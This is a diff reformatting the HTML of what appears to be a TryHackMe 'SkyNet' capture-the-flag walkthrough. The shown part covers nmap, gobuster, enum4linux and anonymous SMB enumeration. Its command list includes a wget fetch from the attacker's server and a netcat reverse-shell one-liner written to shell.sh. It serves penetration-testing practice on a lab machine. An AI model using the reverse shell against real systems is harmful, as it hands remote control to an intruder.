@@ -1,18 +1,177 @@
-<!doctype html><html lang=en-us><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><link rel=preload as=font href=https://www.xuptox.org/fonts/vendor/jost/jost-v4-latin-regular.woff2 type=font/woff2 crossorigin><link rel=preload as=font href=https://www.xuptox.org/fonts/vendor/jost/jost-v4-latin-700.woff2 type=font/woff2 crossorigin><link rel=stylesheet href=https://www.xuptox.org/main.aedd9c21cdf7bcd85258722fad979fba05edccc853d1f472a64aedb8e202296f5ba0be45164bdf976205b0c20564503be3fcf6a692faa4ad7a38468caff1ff3c.css integrity="sha512-rt2cIc33vNhSWHIvrZefugXtzMhT0fRypkrtuOICKW9boL5FFkvfl2IFsMIFZFA74/z2ppL6pK16OEaMr/H/PA==" crossorigin=anonymous><noscript><style>img.lazyload{display:none}</style></noscript><meta name=robots content="index, follow"><meta name=googlebot content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1"><meta name=bingbot content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1"><title>SkyNet - Xuptox</title><meta name=description content="A vulnerable Terminator themed Linux machine. Are you able to compromise this Terminator themed machine?"><link rel=canonical href=https://www.xuptox.org/docs/tryhackme/skynet/><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/"><meta name=twitter:title content="SkyNet"><meta name=twitter:description content="A vulnerable Terminator themed Linux machine. Are you able to compromise this Terminator themed machine?"><meta name=twitter:site content="@"><meta name=twitter:creator content="@"><meta property="og:title" content="SkyNet"><meta property="og:description" content="A vulnerable Terminator themed Linux machine. Are you able to compromise this Terminator themed machine?"><meta property="og:type" content="article"><meta property="og:url" content="/docs/tryhackme/skynet/"><meta property="og:image" content="/"><meta property="article:published_time" content="2021-04-30T21:00:14+02:00"><meta property="article:modified_time" content="2021-04-30T21:00:14+02:00"><meta property="og:site_name" content="Xuptox"><meta property="article:publisher" content="https://www.facebook.com/"><meta property="article:author" content="https://www.facebook.com/"><meta property="og:locale" content="en_US"><script type=application/ld+json>{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https:\/\/www.xuptox.org"},{"@type":"ListItem","position":3,"name":"Docs","item":"https:\/\/www.xuptox.org\/docs\/"},{"@type":"ListItem","position":4,"name":"Tryhackme","item":"https:\/\/www.xuptox.org\/docs\/tryhackme\/"},{"@type":"ListItem","position":5,"name":"Skynet","item":"https:\/\/www.xuptox.org\/docs\/tryhackme\/skynet\/"}]}</script><meta name=theme-color content="#fff"><link rel=manifest href=https://www.xuptox.org/site.webmanifest><link rel=apple-touch-icon sizes=57x57 href=https://www.xuptox.org/apple-icon-57x57.png><link rel=apple-touch-icon sizes=60x60 href=https://www.xuptox.org/apple-icon-60x60.png><link rel=apple-touch-icon sizes=72x72 href=https://www.xuptox.org/apple-icon-72x72.png><link rel=apple-touch-icon sizes=76x76 href=https://www.xuptox.org/apple-icon-76x76.png><link rel=apple-touch-icon sizes=114x114 href=https://www.xuptox.org/apple-icon-114x114.png><link rel=apple-touch-icon sizes=120x120 href=https://www.xuptox.org/apple-icon-120x120.png><link rel=apple-touch-icon sizes=144x144 href=https://www.xuptox.org/apple-icon-144x144.png><link rel=apple-touch-icon sizes=152x152 href=https://www.xuptox.org/apple-icon-152x152.png><link rel=apple-touch-icon sizes=180x180 href=https://www.xuptox.org/apple-icon-180x180.png><link rel=icon type=image/png sizes=192x192 href=https://www.xuptox.org/android-icon-192x192.png><link rel=icon type=image/png sizes=32x32 href=https://www.xuptox.org/favicon-32x32.png><link rel=icon type=image/png sizes=96x96 href=https://www.xuptox.org/favicon-96x96.png><link rel=icon type=image/png sizes=16x16 href=https://www.xuptox.org/favicon-16x16.png><meta name=msapplication-TileColor content="#ffffff"><meta name=msapplication-TileImage content="/ms-icon-144x144.png"></head><body class="docs single"><div class="header-bar fixed-top"></div><header class="navbar fixed-top navbar-expand-md navbar-light"><div class=container><input class="menu-btn order-0" type=checkbox id=menu-btn>
-<label class="menu-icon d-md-none" for=menu-btn><span class=navicon></span></label><a class="navbar-brand order-1 order-md-0 me-auto" href=https://www.xuptox.org/>Xuptox</a>
+<!doctype html><html lang=en-us>
+<head>
+<meta charset=utf-8>
+<meta http-equiv=x-ua-compatible content="ie=edge">
+<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
+<link rel=preload as=font href=https://www.xuptox.org/fonts/vendor/jost/jost-v4-latin-regular.woff2 type=font/woff2 crossorigin>
+<link rel=preload as=font href=https://www.xuptox.org/fonts/vendor/jost/jost-v4-latin-700.woff2 type=font/woff2 crossorigin>
+<link rel=stylesheet href=https://www.xuptox.org/main.7a3a0802720138950ed4884ae6d1f3290c6e690542e22ab5220fd75431524734e52f831ab3cd50f04dd483094d55dad833cb0f27c5f87e11930524fc3d2aa09a.css integrity="sha512-ejoIAnIBOJUO1IhK5tHzKQxuaQVC4iq1Ig/XVDFSRzTlL4Mas81Q8E3UgwlNVdrYM8sPJ8X4fhGTBST8PSqgmg==" crossorigin=anonymous>
+<noscript><style>img.lazyload{display:none}</style></noscript>
+<meta name=robots content="index, follow">
+<meta name=googlebot content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
+<meta name=bingbot content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
+<title>SkyNet - Xuptox</title>
+<meta name=description content="A vulnerable Terminator themed Linux machine. Are you able to compromise this Terminator themed machine?">
+<link rel=canonical href=https://www.xuptox.org/docs/tryhackme/skynet/>
+<meta name=twitter:card content="summary_large_image">
+<meta name=twitter:image content="/">
+<meta name=twitter:title content="SkyNet">
+<meta name=twitter:description content="A vulnerable Terminator themed Linux machine. Are you able to compromise this Terminator themed machine?">
+<meta name=twitter:site content="@">
+<meta name=twitter:creator content="@">
+<meta property="og:title" content="SkyNet">
+<meta property="og:description" content="A vulnerable Terminator themed Linux machine. Are you able to compromise this Terminator themed machine?">
+<meta property="og:type" content="article">
+<meta property="og:url" content="/docs/tryhackme/skynet/">
+<meta property="og:image" content="/">
+<meta property="article:published_time" content="2021-04-30T21:00:14+02:00">
+<meta property="article:modified_time" content="2021-04-30T21:00:14+02:00">
+<meta property="og:site_name" content="Xuptox">
+<meta property="article:publisher" content="https://www.facebook.com/">
+<meta property="article:author" content="https://www.facebook.com/">
+<meta property="og:locale" content="en_US">
+<script type=application/ld+json>{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https:\/\/www.xuptox.org"},{"@type":"ListItem","position":3,"name":"Docs","item":"https:\/\/www.xuptox.org\/docs\/"},{"@type":"ListItem","position":4,"name":"Tryhackme","item":"https:\/\/www.xuptox.org\/docs\/tryhackme\/"},{"@type":"ListItem","position":5,"name":"Skynet","item":"https:\/\/www.xuptox.org\/docs\/tryhackme\/skynet\/"}]}</script>
+<meta name=theme-color content="#fff">
+<link rel=manifest href=https://www.xuptox.org/site.webmanifest>
+<link rel=apple-touch-icon sizes=57x57 href=https://www.xuptox.org/apple-icon-57x57.png>
+<link rel=apple-touch-icon sizes=60x60 href=https://www.xuptox.org/apple-icon-60x60.png>
+<link rel=apple-touch-icon sizes=72x72 href=https://www.xuptox.org/apple-icon-72x72.png>
+<link rel=apple-touch-icon sizes=76x76 href=https://www.xuptox.org/apple-icon-76x76.png>
+<link rel=apple-touch-icon sizes=114x114 href=https://www.xuptox.org/apple-icon-114x114.png>
+<link rel=apple-touch-icon sizes=120x120 href=https://www.xuptox.org/apple-icon-120x120.png>
+<link rel=apple-touch-icon sizes=144x144 href=https://www.xuptox.org/apple-icon-144x144.png>
+<link rel=apple-touch-icon sizes=152x152 href=https://www.xuptox.org/apple-icon-152x152.png>
+<link rel=apple-touch-icon sizes=180x180 href=https://www.xuptox.org/apple-icon-180x180.png>
+<link rel=icon type=image/png sizes=192x192 href=https://www.xuptox.org/android-icon-192x192.png>
+<link rel=icon type=image/png sizes=32x32 href=https://www.xuptox.org/favicon-32x32.png>
+<link rel=icon type=image/png sizes=96x96 href=https://www.xuptox.org/favicon-96x96.png>
+<link rel=icon type=image/png sizes=16x16 href=https://www.xuptox.org/favicon-16x16.png>
+<meta name=msapplication-TileColor content="#ffffff">
+<meta name=msapplication-TileImage content="/ms-icon-144x144.png">
+</head>
+<body class="docs single">
+<div class="header-bar fixed-top"></div>
+<header class="navbar fixed-top navbar-expand-md navbar-light">
+<div class=container>
+<input class="menu-btn order-0" type=checkbox id=menu-btn>
+<label class="menu-icon d-md-none" for=menu-btn><span class=navicon></span></label>
+<a class="navbar-brand order-1 order-md-0 me-auto" href=https://www.xuptox.org/>Xuptox</a>
 <button id=mode class="btn btn-link order-2 order-md-4" type=button aria-label="Toggle mode">
-<span class=toggle-dark><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-moon"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg></span><span class=toggle-light><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-sun"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></span></button><ul class="navbar-nav social-nav order-3 order-md-5"><li class=nav-item><a class=nav-link href=https://github.com/xuptox><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-github"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg><span class="ms-2 visually-hidden">GitHub</span></a></li></ul><div class="collapse navbar-collapse order-4 order-md-1"><ul class="navbar-nav main-nav me-auto order-5 order-md-2"><li class=nav-item><a class=nav-link href=https://www.xuptox.org/docs/tryhackme/>TryHackMe</a></li><li class=nav-item><a class=nav-link href=https://www.xuptox.org/docs/github/>GitHub</a></li></ul><div class="break order-6 d-md-none"></div><form class="navbar-form flex-grow-1 order-7 order-md-3"><input id=userinput class="form-control is-search" type=search placeholder="Search docs..." aria-label="Search docs..." autocomplete=off><div id=suggestions class="shadow bg-white rounded"></div></form></div></div></header><div class="wrap container" role=document><div class=content><div class="row flex-xl-nowrap"><div class="col-md-3 col-lg-3 col-xl-3 docs-sidebar"><nav class=docs-links aria-label="Main navigation"><h3>TryHackMe</h3><ul class=list-unstyled><li><a class=docs-link href=https://www.xuptox.org/docs/tryhackme/gamezone/>GameZone</a></li><li><a class=docs-link href=https://www.xuptox.org/docs/tryhackme/hackpark/>HackPark</a></li><li><a class=docs-link href=https://www.xuptox.org/docs/tryhackme/ice/>Ice</a></li><li><a class=docs-link href=https://www.xuptox.org/docs/tryhackme/skynet/>SkyNet</a></li></ul><h3>github</h3><ul class=list-unstyled><li><a class=docs-link href=https://www.xuptox.org/docs/github/setup_github_pages/>Create Repo For Hugo On GitHub</a></li></ul></nav></div><nav class="docs-toc d-none d-xl-block col-xl-3" aria-label="Secondary navigation"><div class=page-links><h3>On this page</h3><nav id=TableOfContents><ul><li><a href=#room-description>Room Description</a></li><li><a href=#used-commands>Used Commands</a></li><li><a href=#enumeration>Enumeration</a><ul><li><a href=#nmap>Nmap</a></li><li><a href=#gobuster>Gobuster</a></li><li><a href=#whats-in-the-reports>What&rsquo;s in the reports?</a></li><li><a href=#website>Website</a></li><li><a href=#smb>SMB</a></li><li><a href=#squirrelmail>SquirrelMail</a></li><li><a href=#whats-the-hidden-directory>What&rsquo;s the hidden directory?</a></li></ul></li><li><a href=#quick-summary>Quick Summary</a></li><li><a href=#digging-deeper>Digging deeper</a></li><li><a href=#gain-initial-reverse-shell>Gain initial Reverse Shell</a></li><li><a href=#extend-shell-to-root>Extend Shell to root</a><ul><li><a href=#solution-1-linux-kernel>Solution 1: Linux Kernel</a></li><li><a href=#solution-2-wildcards>Solution 2: Wildcards</a></li></ul></li></ul></nav></div></nav><main class="docs-content col-lg-13 col-xl-10"><nav aria-label=breadcrumb><ol class=breadcrumb><li class=breadcrumb-item><a href=https://www.xuptox.org/>Home</a></li><li class=breadcrumb-item><a href=https://www.xuptox.org/docs/>WriteUps</a></li><li class=breadcrumb-item><a href=https://www.xuptox.org/docs/tryhackme/>Try Hack Me</a></li><li class="breadcrumb-item active" aria-current=page>SkyNet</li></ol></nav><h1>SkyNet</h1><p class=lead>A vulnerable Terminator themed Linux machine. Are you able to compromise this Terminator themed machine?</p><a><kbd class="item-tag Linux">Linux</kbd></a>
+<span class=toggle-dark><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-moon"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg></span>
+<span class=toggle-light><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-sun"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></span>
+</button>
+<ul class="navbar-nav social-nav order-3 order-md-5">
+<li class=nav-item>
+<a class=nav-link href=https://github.com/xuptox><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-github"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg><span class="ms-2 visually-hidden">GitHub</span></a>
+</li>
+</ul>
+<div class="collapse navbar-collapse order-4 order-md-1">
+<ul class="navbar-nav main-nav me-auto order-5 order-md-2"><li class=nav-item>
+<a class=nav-link href=https://www.xuptox.org/docs/tryhackme/>TryHackMe</a>
+</li>
+<li class=nav-item>
+<a class=nav-link href=https://www.xuptox.org/docs/github/>GitHub</a>
+</li>
+</ul>
+<div class="break order-6 d-md-none"></div>
+<form class="navbar-form flex-grow-1 order-7 order-md-3">
+<input id=userinput class="form-control is-search" type=search placeholder="Search docs..." aria-label="Search docs..." autocomplete=off>
+<div id=suggestions class="shadow bg-white rounded"></div>
+</form>
+</div>
+</div>
+</header>
+<div class="wrap container" role=document>
+<div class=content>
+<div class="row flex-xl-nowrap">
+<div class="col-md-3 col-lg-3 col-xl-3 docs-sidebar">
+<nav class=docs-links aria-label="Main navigation">
+<h3>TryHackMe</h3>
+<ul class=list-unstyled>
+<li>
+<a class=docs-link href=https://www.xuptox.org/docs/tryhackme/gamezone/>GameZone</a>
+</li>
+<li>
+<a class=docs-link href=https://www.xuptox.org/docs/tryhackme/hackpark/>HackPark</a>
+</li>
+<li>
+<a class=docs-link href=https://www.xuptox.org/docs/tryhackme/ice/>Ice</a>
+</li>
+<li>
+<a class=docs-link href=https://www.xuptox.org/docs/tryhackme/skynet/>SkyNet</a>
+</li>
+</ul>
+<h3>github</h3>
+<ul class=list-unstyled>
+<li>
+<a class=docs-link href=https://www.xuptox.org/docs/github/setup_github_pages/>Create Repo For Hugo On GitHub</a>
+</li>
+</ul>
+</nav>
+</div>
+<nav class="docs-toc d-none d-xl-block col-xl-3" aria-label="Secondary navigation">
+<div class=page-links>
+<h3>On this page</h3>
+<nav id=TableOfContents>
+<ul>
+<li><a href=#room-description>Room Description</a></li>
+<li><a href=#used-commands>Used Commands</a></li>
+<li><a href=#enumeration>Enumeration</a>
+<ul>
+<li><a href=#nmap>Nmap</a></li>
+<li><a href=#gobuster>Gobuster</a></li>
+<li><a href=#whats-in-the-reports>What&rsquo;s in the reports?</a></li>
+<li><a href=#website>Website</a></li>
+<li><a href=#smb>SMB</a></li>
+<li><a href=#squirrelmail>SquirrelMail</a></li>
+<li><a href=#whats-the-hidden-directory>What&rsquo;s the hidden directory?</a></li>
+</ul>
+</li>
+<li><a href=#quick-summary>Quick Summary</a></li>
+<li><a href=#digging-deeper>Digging deeper</a></li>
+<li><a href=#gain-initial-reverse-shell>Gain initial Reverse Shell</a></li>
+<li><a href=#extend-shell-to-root>Extend Shell to root</a>
+<ul>
+<li><a href=#solution-1-linux-kernel>Solution 1: Linux Kernel</a></li>
+<li><a href=#solution-2-wildcards>Solution 2: Wildcards</a></li>
+</ul>
+</li>
+</ul>
+</nav>
+</div>
+</nav>
+<main class="docs-content col-lg-13 col-xl-10">
+<nav aria-label=breadcrumb>
+<ol class=breadcrumb>
+<li class=breadcrumb-item><a href=https://www.xuptox.org/>Home</a></li>
+<li class=breadcrumb-item><a href=https://www.xuptox.org/docs/>WriteUps</a></li>
+<li class=breadcrumb-item><a href=https://www.xuptox.org/docs/tryhackme/>Try Hack Me</a></li>
+<li class="breadcrumb-item active" aria-current=page>SkyNet</li>
+</ol>
+</nav>
+<h1>SkyNet</h1>
+<p class=lead>A vulnerable Terminator themed Linux machine. Are you able to compromise this Terminator themed machine?</p>
+<a><kbd class="item-tag Linux">Linux</kbd></a>
 <a><kbd class="item-tag CVE">CVE</kbd></a>
 <a><kbd class="item-tag RFI">RFI</kbd></a>
-<a><kbd class="item-tag linPEAS">linPEAS</kbd></a><h2 id=room-description>Room Description<a href=#room-description class=anchor aria-hidden=true>#</a></h2><p>A vulnerable Terminator themed Linux machine. Are you able to compromise this Terminator themed machine? <a href=https://tryhackme.com/room/skynet>Find THM room here</a></p><h2 id=used-commands>Used Commands<a href=#used-commands class=anchor aria-hidden=true>#</a></h2><pre><code class=language-sh>nmap -sV -sC -oN nmap.out -vv &lt;target ip&gt;
+<a><kbd class="item-tag linPEAS">linPEAS</kbd></a>
+<h2 id=room-description>Room Description<a href=#room-description class=anchor aria-hidden=true>#</a> </h2>
+<p>A vulnerable Terminator themed Linux machine. Are you able to compromise this Terminator themed machine? <a href=https://tryhackme.com/room/skynet>Find THM room here</a></p>
+<h2 id=used-commands>Used Commands<a href=#used-commands class=anchor aria-hidden=true>#</a> </h2>
+<pre><code class=language-sh>nmap -sV -sC -oN nmap.out -vv &lt;target ip&gt;
 gobuster dir -u http://&lt;target ip&gt;:&lt;target port&gt; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee gobuster.txt
 /usr/share/enum4linux/enum4linux.pl -a &lt;target ip&gt; | tee enum4linux.txt
 smbclient //&lt;target ip&gt;/anonymous -U
 python -m http.server &lt;webserver port&gt;
 wget http://&lt;webserver ip&gt;:&lt;webserver port&gt;/&lt;file name&gt;
 echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;atk ip&gt; &lt;atkport&gt; &gt;/tmp/f&quot; &gt; shell.sh
-</code></pre><h2 id=enumeration>Enumeration<a href=#enumeration class=anchor aria-hidden=true>#</a></h2><p>The task description does not give too much information. Using Nmap and gobuster is a good way to start with.
-The next two steps show how the way I enumerated the target with Nmap and gobuster. The third step will be a summary of what information was found.</p><h3 id=nmap>Nmap<a href=#nmap class=anchor aria-hidden=true>#</a></h3><p>Run: <code>nmap -sV -sC -oN nmap.out -vv &lt;target ip></code></p><pre><code class=language-sh>Starting Nmap 7.80 ( https://nmap.org ) at 2021-04-24 20:54 UTC
+</code></pre>
+<h2 id=enumeration>Enumeration<a href=#enumeration class=anchor aria-hidden=true>#</a> </h2>
+<p>The task description does not give too much information. Using Nmap and gobuster is a good way to start with.
+The next two steps show how the way I enumerated the target with Nmap and gobuster. The third step will be a summary of what information was found.</p>
+<h3 id=nmap>Nmap<a href=#nmap class=anchor aria-hidden=true>#</a> </h3>
+<p>Run: <code>nmap -sV -sC -oN nmap.out -vv &lt;target ip></code></p>
+<pre><code class=language-sh>Starting Nmap 7.80 ( https://nmap.org ) at 2021-04-24 20:54 UTC
 NSE: Loaded 151 scripts for scanning.
 ...
 PORT    STATE SERVICE     REASON         VERSION
@@ -37,7 +196,12 @@ PORT    STATE SERVICE     REASON         VERSION
 445/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
 MAC Address: 02:9D:B2:03:AA:DD (Unknown)
 Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel
-</code></pre><p>Continue with the next step in another shell.</p><h3 id=gobuster>Gobuster<a href=#gobuster class=anchor aria-hidden=true>#</a></h3><p>Start gobuster and let it work in parallel. I expected a different result when running the following command without a specified port, but this was not the case.</p><p>Run <code>gobuster dir -u http://&lt;target ip>:&lt;target port> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee gobuster.txt</code></p><pre><code class=language-sh>===============================================================
+</code></pre>
+<p>Continue with the next step in another shell.</p>
+<h3 id=gobuster>Gobuster<a href=#gobuster class=anchor aria-hidden=true>#</a> </h3>
+<p>Start gobuster and let it work in parallel. I expected a different result when running the following command without a specified port, but this was not the case.</p>
+<p>Run <code>gobuster dir -u http://&lt;target ip>:&lt;target port> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee gobuster.txt</code></p>
+<pre><code class=language-sh>===============================================================
 Gobuster v3.0.1
 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
 ===============================================================
@@ -60,8 +224,71 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
 ===============================================================
 2021/04/24 21:08:32 Finished
 ===============================================================
-</code></pre><h3 id=whats-in-the-reports>What&rsquo;s in the reports?<a href=#whats-in-the-reports class=anchor aria-hidden=true>#</a></h3><p>Nmap and Gobuster show a couple of open ports and available directories. Read the reports carefully. You should be able to extract similar information as follow. I&rsquo;ve listed them below:</p><table><thead><tr><th>Service</th><th>Port</th></tr></thead><tbody><tr><td>Apache 2.4.18 Webserver</td><td>80</td></tr><tr><td>SMB</td><td>139/445</td></tr><tr><td>SSH</td><td>22</td></tr><tr><td>Dovecot Mailserver</td><td>110/143</td></tr></tbody></table><table><thead><tr><th>Directories</th><th>Result</th></tr></thead><tbody><tr><td>/admin</td><td>Forbidden</td></tr><tr><td>/config</td><td>Forbidden</td></tr><tr><td>/squirrelmail</td><td>Login</td></tr><tr><td>/ai</td><td>Forbidden</td></tr></tbody></table><p>Further, have a look at the source code of the website. Sometimes you can spot some useful information.</p><h3 id=website>Website<a href=#website class=anchor aria-hidden=true>#</a></h3><p>Open your browser and navigate to <code>http://&lt;target ip></code></p><img class="img-simple img-fluid lazyload blur-up" src=https://www.xuptox.org/docs/tryhackme/skynet/thm_skynet_welcome_hu714079a8a4f298dd8e775b851d0ebc62_10553_20x0_resize_box_2.png data-src=https://www.xuptox.org/docs/tryhackme/skynet/thm_skynet_welcome.png width=876 height=306 alt="Screenshot of the website behind the webserver"><p>I played around a little but there seems not much to be. Then I used searchsploit in the hope to find some vulnerabilities for Apache 2.4.18 but couldn&rsquo;t find something that helps to get a foot in the door. At this point, I thought about going for that login screen <code>/squirrelmail</code> but the information is rare so I decided to go for SMB.
-Let&rsquo;s go!</p><h3 id=smb>SMB<a href=#smb class=anchor aria-hidden=true>#</a></h3><p>Use enum4linux to collect info about shares. Use the path to your enum4linx.pl script run it.</p><p>For me it&rsquo;s <code>/usr/share/enum4linux/enum4linux.pl -a &lt;target ip> | tee enum4linux.txt</code></p><pre><code class=language-sh> ==========================
+</code></pre>
+<h3 id=whats-in-the-reports>What&rsquo;s in the reports?<a href=#whats-in-the-reports class=anchor aria-hidden=true>#</a> </h3>
+<p>Nmap and Gobuster show a couple of open ports and available directories. Read the reports carefully. You should be able to extract similar information as follow. I&rsquo;ve listed them below:</p>
+<table>
+<thead>
+<tr>
+<th>Service</th>
+<th>Port</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Apache 2.4.18 Webserver</td>
+<td>80</td>
+</tr>
+<tr>
+<td>SMB</td>
+<td>139/445</td>
+</tr>
+<tr>
+<td>SSH</td>
+<td>22</td>
+</tr>
+<tr>
+<td>Dovecot Mailserver</td>
+<td>110/143</td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>Directories</th>
+<th>Result</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>/admin</td>
+<td>Forbidden</td>
+</tr>
+<tr>
+<td>/config</td>
+<td>Forbidden</td>
+</tr>
+<tr>
+<td>/squirrelmail</td>
+<td>Login</td>
+</tr>
+<tr>
+<td>/ai</td>
+<td>Forbidden</td>
+</tr>
+</tbody>
+</table>
+<p>Further, have a look at the source code of the website. Sometimes you can spot some useful information.</p>
+<h3 id=website>Website<a href=#website class=anchor aria-hidden=true>#</a> </h3>
+<p>Open your browser and navigate to <code>http://&lt;target ip></code></p>
+<img class="img-simple img-fluid lazyload blur-up" src=https://www.xuptox.org/docs/tryhackme/skynet/thm_skynet_welcome_hu714079a8a4f298dd8e775b851d0ebc62_10553_20x0_resize_box_3.png data-src=https://www.xuptox.org/docs/tryhackme/skynet/thm_skynet_welcome.png width=876 height=306 alt="Screenshot of the website behind the webserver">
+<p>I played around a little but there seems not much to be. Then I used searchsploit in the hope to find some vulnerabilities for Apache 2.4.18 but couldn&rsquo;t find something that helps to get a foot in the door. At this point, I thought about going for that login screen <code>/squirrelmail</code> but the information is rare so I decided to go for SMB.
+Let&rsquo;s go!</p>
+<h3 id=smb>SMB<a href=#smb class=anchor aria-hidden=true>#</a> </h3>
+<p>Use enum4linux to collect info about shares. Use the path to your enum4linx.pl script run it.</p>
+<p>For me it&rsquo;s <code>/usr/share/enum4linux/enum4linux.pl -a &lt;target ip> | tee enum4linux.txt</code></p>
+<pre><code class=language-sh> ==========================
 |    Target Information    |
  ==========================
 Target ........... 10.10.61.56
@@ -111,7 +338,34 @@ S-1-5-21-2393614426-3774336851-1116533619-500 *unknown*\*unknown* (8)
 S-1-5-21-2393614426-3774336851-1116533619-501 SKYNET\nobody (Local User)
 S-1-5-21-2393614426-3774336851-1116533619-1000 SKYNET\milesdyson (Local User)
 ...
-</code></pre><p>Check the log and find some useful info for us.</p><table><thead><tr><th>Fact</th><th>Description</th></tr></thead><tbody><tr><td>Anonymous Login</td><td>Yes</td></tr><tr><td>Users</td><td><code>SKYNET\milesdyson (Local User)</code></td></tr><tr><td>Shares</td><td><code>anonymous</code>, <code>milesdyson</code></td></tr></tbody></table><p>Let&rsquo;s try to connect and see what we get!</p><p>Share of interest is <code>anonymous</code> user is <code>''</code> and password is <code>''</code></p><p>Run <code>smbclient //&lt;target ip>/anonymous -U</code> and confirm two times.</p><pre><code class=language-sh>root@kali:~/Desktop# smbclient //10.10.61.56/anonymous -U
+</code></pre>
+<p>Check the log and find some useful info for us.</p>
+<table>
+<thead>
+<tr>
+<th>Fact</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Anonymous Login</td>
+<td>Yes</td>
+</tr>
+<tr>
+<td>Users</td>
+<td><code>SKYNET\milesdyson (Local User)</code></td>
+</tr>
+<tr>
+<td>Shares</td>
+<td><code>anonymous</code>, <code>milesdyson</code></td>
+</tr>
+</tbody>
+</table>
+<p>Let&rsquo;s try to connect and see what we get!</p>
+<p>Share of interest is <code>anonymous</code> user is <code>''</code> and password is <code>''</code></p>
+<p>Run <code>smbclient //&lt;target ip>/anonymous -U</code> and confirm two times.</p>
+<pre><code class=language-sh>root@kali:~/Desktop# smbclient //10.10.61.56/anonymous -U
 Enter WORKGROUP\root's password:
 Try &quot;help&quot; to get a list of possible commands.
 smb: \&gt; dir
@@ -120,14 +374,54 @@ smb: \&gt; dir
   attention.txt                       N      163  Wed Sep 18 03:04:59 2019
   logs                                D        0  Wed Sep 18 04:42:16 2019
                 9204224 blocks of size 1024. 5788828 blocks available
-</code></pre><p>Get both <code>attention.txt</code> and the log files in <code>logs</code>.</p><pre><code>A recent system malfunction has caused various passwords to be changed.
+</code></pre>
+<p>Get both <code>attention.txt</code> and the log files in <code>logs</code>.</p>
+<pre><code>A recent system malfunction has caused various passwords to be changed.
 All skynet employees are required to change their password after seeing this.
 -Miles Dyson
-</code></pre><p><code>log1.txt</code> seems to contain some passwords.</p><p>User is <code>milesdyson</code> password is taken from the list.
